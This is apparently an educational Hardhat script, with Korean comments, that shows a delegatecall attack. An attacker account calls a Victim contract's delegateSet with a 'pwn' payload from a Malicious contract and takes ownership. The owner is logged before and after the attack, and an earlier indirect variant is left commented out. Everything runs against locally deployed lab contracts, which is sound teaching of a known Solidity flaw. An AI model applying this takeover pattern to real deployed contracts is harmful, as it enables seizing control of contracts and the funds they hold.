// DeployAndAttack 컨트랙트를 통해 간접적으로 호출한 공격사례
// const hre = require("hardhat");

// async function main() {
//   const [attacker] = await hre.ethers.getSigners();

//   const DeployAndAttack = await hre.ethers.getContractFactory(
//     "DeployAndAttack"
//   );
//   const attackContract = await DeployAndAttack.deploy();
//   await attackContract.waitForDeployment();

//   console.log("🚀 Contracts deployed");

//   console.log("🔍 Before attack owner:", await attackContract.getOwner());

//   //DeployAndAttack 컨트랙트를 통해 공격
//   const tx = await attackContract.attack();
//   await tx.wait();

//   console.log("💥 After attack owner:", await attackContract.getOwner());
//   console.log("🙋 Attacker:", attacker.address);
// }

// main();

// EOA가 직접 Victim의 delegateSet함수 호출 유도 (EOA가 Victim의 msg.sender가 되도록)
const hre = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();

  //Victim은 deployer가 배포, Malicious는 attacker가 배포하도록 설정
  const Victim = await hre.ethers.getContractFactory("Victim", deployer);
  const Malicious = await hre.ethers.getContractFactory("Malicious", attacker);

  const victim = await Victim.deploy();
  await victim.waitForDeployment();

  const malicious = await Malicious.deploy();
  await malicious.waitForDeployment();

  console.log("Contracts deployed");
  console.log("Victim address:", await victim.getAddress());
  console.log("Malicious address:", await malicious.getAddress());

  // 공격 전 owner 상태 확인
  let ownerBefore = await victim.owner();
  console.log("Before attack, owner:", ownerBefore);

  // payload 생성
  const payload = malicious.interface.encodeFunctionData("pwn");

  // EOA가 직접 호출
  const tx = await victim
    .connect(attacker)
    .delegateSet(await malicious.getAddress(), payload);
  await tx.wait();

  // 공격 후 owner 상태 확인
  let ownerAfter = await victim.owner();
  console.log("After attack, owner:", ownerAfter);
  console.log("Attacker EOA:", await attacker.getAddress());
}

main();
